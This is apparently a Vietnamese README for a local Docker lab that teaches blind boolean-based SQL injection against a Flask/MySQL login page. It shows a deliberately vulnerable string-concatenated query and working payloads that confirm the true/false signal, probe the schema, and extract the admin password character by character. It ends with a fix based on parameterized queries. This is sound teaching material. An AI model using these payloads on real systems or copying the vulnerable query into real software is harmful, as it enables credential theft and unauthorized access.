# Blind Boolean-based SQLi Lab(Flask + MySQL + Docker)

## Mục tiêu
- Minh họa **Blind Boolean-based SQL Injection** trên **trang đăng nhập**.
- Username cố định `admin`. **Mật khẩu = FLAG** lưu trong DB.
- Ứng dụng **không** hiển thị lỗi SQL; chỉ báo *“Đăng nhập thành công/Thất bại”*.

## Chạy lab
```bash
docker compose up --build
# Mở: http://127.0.0.1:5005/login
```

## Lỗ hổng
Trong `app.py`:
```python
query = (
    "SELECT id FROM users "
    f"WHERE username = '{username}' AND password = '{password}' LIMIT 1"
)
```
`username`, `password` được **nối thẳng** vào câu SQL. Khi nhập `username=admin`, kẻ tấn công chèn SQL trong ô **password**.
- Nếu biểu thức boolean là **TRUE** → truy vấn khớp → **Đăng nhập thành công**.
- Nếu **FALSE** → **Đăng nhập thất bại**.

Đây là đặc trưng của **blind boolean-based** (phân biệt qua hành vi/ UI, không cần thông báo lỗi).

## Khai thác
`username=admin`. Tấn công vào trường **password** bằng cách đóng chuỗi `'` rồi thêm điều kiện:
```
' OR (điều_kiện_boolean) -- -
```
> Câu gốc:
> `... AND password = '<payload>'`
>
> Sau chèn:
> `... AND password = '' OR (điều_kiện) -- -`
>
> Kết quả phụ thuộc TRUE/FALSE của `(điều_kiện)`.

### Kiểm tra kênh TRUE/FALSE
- TRUE:
```
password: ' OR (SELECT 1) -- -
```
- FALSE:
```
password: ' OR (SELECT 0) -- -
```
Quan sát: TRUE → “Đăng nhập thành công”, FALSE → “Đăng nhập thất bại”.

### Kiểm tra tồn tại bảng/cột (nếu cần)
- Bảng `users`:
```
' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')>0 -- -
```
- Cột `password`:
```
' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' AND column_name='password')>0 -- -
```

### Dò độ dài FLAG
```
' OR (LENGTH((SELECT password FROM users WHERE username='admin')) > 20) -- -
```
Nếu “thành công” → độ dài > 20 là **TRUE**. Dùng nhị phân để tìm đúng LENGTH.

### Dò từng ký tự (SUBSTRING/ASCII)
Ký tự thứ `i`:
```
' OR (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), i, 1 )) > 70) -- -
```
Dùng so sánh `>`/`<`/`=` để suy ra ASCII → ra ký tự.  
Hoặc so sánh trực tiếp:
```
' OR (SUBSTRING((SELECT password FROM users WHERE username='admin'), i, 1 )='F') -- -
```

## Cách vá
- Dùng **prepared statements** / **parameterized queries**:
  ```python
  cur.execute(
      "SELECT id FROM users WHERE username=%s AND password=%s LIMIT 1",
      (username, password)
  )
  ```
- Thêm cơ chế khóa/đếm số lần thử.
- Tránh khác biệt UI rõ rệt giữa TRUE/FALSE.
